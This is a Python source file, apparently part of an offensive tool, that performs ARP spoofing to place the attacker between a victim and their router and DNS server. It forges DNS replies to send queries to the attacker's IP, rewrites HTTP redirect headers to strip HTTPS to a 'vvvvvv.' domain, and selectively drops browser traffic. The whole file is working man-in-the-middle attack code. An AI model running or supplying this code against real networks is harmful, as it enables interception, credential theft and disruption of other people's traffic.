import sys
from scapy.all import Ether,conf, get_if_addr,get_if_hwaddr,sendp,sniff,IP,DNS,DNSRR,UDP ,Raw,TCP ,DNSQR,NTP
import time
import signal 
import threading
import spoofing.arp_util as arp_util
import spoofing.dns_local as dns_local
from spoofing.http_ex  import HTTP
from  utils.printing import Printing
import re
from enum import Enum
ntpSpoofed = False 
class DNSMode(Enum):
    NtpSpoofed = 0 
    UrlSpoofed = 1 
    

def validateDNS(packet:DNS)->bool: 
    ''' checks if the packet is a valid DNS packet for spoofing '''
    try: 
        if ntpSpoofed and DNSQR in packet : 
            return True ,DNSMode.NtpSpoofed
        if DNSQR in packet and packet[DNSQR].qname.decode().removeprefix('https://').startswith("vvvvvv.") : 
            return True ,DNSMode.UrlSpoofed
    except: 
        ...
    if DNSQR in packet : 
        Printing.printError(packet[DNSQR].qname.decode())
    return False ,None 

def validateHttp(rawp:bytes)->bool:
    ''' check if the packet is an HTTP packet '''
    VALIDHTTP=b"HTTP"
    try : 
        return rawp.startswith(VALIDHTTP)
    except : 
        return False 
    

    
def spoofedURL(url:str)->str: 
    '''spoofing the url for sslstrip and replacing www with vvvvvvv and changing https to http and erase port specify '''
    spoofed = url.strip().removeprefix('https://').removeprefix("http://").removeprefix('www.').strip()
    portSpecify = re.search(":\d+",spoofed)
    if portSpecify : 
        spoofed = spoofed[:portSpecify.start()] 
    return f"http://vvvvvv.{spoofed}" 

def throworkill(packet:Ether,routerMac:str , dnsMac:str ,spoofedIp :str ,  interface:str , finishChrome : bool )-> None: 
    ''' if the packet is matching to any kind of spoofing it is spoofing it other wise it just doing ip forwarding  '''
    try:
        # IP forwarding 
        packet[Ether].src = routerMac
        packet[Ether].dst = dnsMac
        #DNS spoofing
        valid , mode =  validateDNS(packet)
        if DNS in packet and valid : 
            Printing.printSuccess(f"poisining :  {packet[DNS].qd.qname} - mode:  {mode} !")
            et = Ether(src =routerMac , dst =  dnsMac )
            ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
            udp = UDP(dport=packet[UDP].dport,sport=packet[UDP].sport)
            dnsdiff= DNS(id=packet[DNS].id,qd=packet[DNS].qd,
                        aa=1,
                        qr=1,
                        an=DNSRR(rrname=packet[DNS].qd.qname,type='A',ttl=10,rdata=spoofedIp))
            packet = et/ip/udp/dnsdiff
        
        #HTTP spoofing 
        elif Raw in packet and validateHttp(packet[Raw].load) : 
            flags = None 
            httpPack = HTTP.fromRawPack(packet[Raw].load,packet[IP].src)
            httpPack.timeTravel()
            if httpPack and httpPack.sslStripavailable(): 
                httpPack.headers["Location"]=spoofedURL(httpPack.headers["Location"])
                print(spoofedURL(httpPack.headers["Location"]))
                Printing.printSuccess(httpPack)
            elif  finishChrome and  httpPack and httpPack.chromeKillerAvailable() : 
                Printing.printWarning("🤯🤯🤯🤯🤯 Chrome Killer in action broooo 🤯🤯🤯🤯🤯")
                Printing.printWarning(httpPack)
                return #drop packet ;-) 
            else : 
                Printing.printError(httpPack)
            et = Ether(src =routerMac , dst =  dnsMac )
            ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
            tcp = TCP(dport=packet[TCP].dport,sport=packet[TCP].sport,seq=packet[TCP].seq , ack =packet[TCP].ack , flags =flags  if flags else packet[TCP].flags )
            raw = Raw(httpPack.toRaw())
            packet = et/ip/tcp/raw
        elif NTP in packet : 
            packet.show()
        
        
        
        # forward the packet 
        sendp(packet,iface=interface,verbose=False) 
    except Exception as e : 
        Printing.printError(e)


    

def HttpDnsSpoofer(victim : str , interface : str , finishChrome : bool )->None:
    ''' gather all the data and start the threads for the spoofing '''
             
    attackData = { 
        "victim": None ,  
        "victimmac":None ,  
        "targetMac" : None,
        "routerMac" : None,
        "mac ":None , #my mac
        "ip" : None , #my ip , 
        "dnsServer" : None , 
        "dnsServerMac" : None ,
        "finishchrome" : None 
    } 
   
    def sniffTraffic():
        Printing.printNotes("sniff is started")
        sniff(lfilter= lambda x : IP in x and x[IP].dst == attackData["victim"] , prn = lambda packet : throworkill(packet, attackData["routerMac"], attackData["victimmac"], attackData["ip"],attackData["interface"], attackData["finishchrome"]) )
        Printing.printNotes("sniff is done ")
    def dispose(*args): 
        ''' changes the arp table to the first value '''
        print("dispoe")
        arp_util.changeArpTable(attackData["router"], attackData["routerMac"], attackData["victim"] , attackData["victimmac"],attackData["interface"] )
        arp_util.changeArpTable(attackData["dnsServer"], attackData["dnsServerMac"], attackData["victim"] , attackData["victimmac"],attackData["interface"] )
        sys.exit(0)
      
    def arpSpoofing():
        ''' arp spoofing to create MITM '''
        Printing.printNotes("arp spoofing is started")
        arp_util.changeArpTable(attackData["router"], attackData["routerMac"], attackData["victim"] , attackData["mac"],attackData["interface"] )
        arp_util.changeArpTable(attackData["dnsServer"], attackData["dnsServerMac"], attackData["victim"] , attackData["mac"],attackData["interface"] )
        
    def redoit():
        ''' arp spoofing mainting '''
        while(True):
            Printing.printLog(f'arp spoofing of {attackData["mac"]} on {attackData["routerMac"]} ')
            time.sleep(45)
   
    #### attackData #### - gather all the neccersy data
    attackData["victim"]=victim
    attackData["interface"]=interface
    attackData["victimmac"]=arp_util.getTargetMac(attackData["victim"], attackData["interface"])
    attackData["router"] = next(filter(lambda x : x[3] == attackData["interface"] , dict(conf.route.__dict__)["routes"]))[2]
    attackData["routerMac"] = arp_util.getTargetMac(attackData["router"], attackData["interface"])
    attackData["mac"]=get_if_hwaddr(attackData["interface"])
    attackData["ip"]= get_if_addr(attackData["interface"])
    attackData["dnsServer"] = dns_local.get_dns_local_server()
    attackData["dnsServerMac"] = arp_util.getTargetMac(attackData["dnsServer"], attackData["interface"])
    attackData["finishchrome"] = finishChrome
    #### attackData ####
    arpSpoofing()
    arpSpoofer = threading.Thread(target=redoit)
    sniffer = threading.Thread(target=sniffTraffic)
    sniffer.start()
    arpSpoofer.start()
    
    signal.signal(signal.SIGINT, dispose)
    Printing.printLog(attackData)
    sniffer.join()
    arpSpoofer.join()
    Printing.printNotes("arp spoofing is done ")
    signal.pause()
    dispose()



 
        
   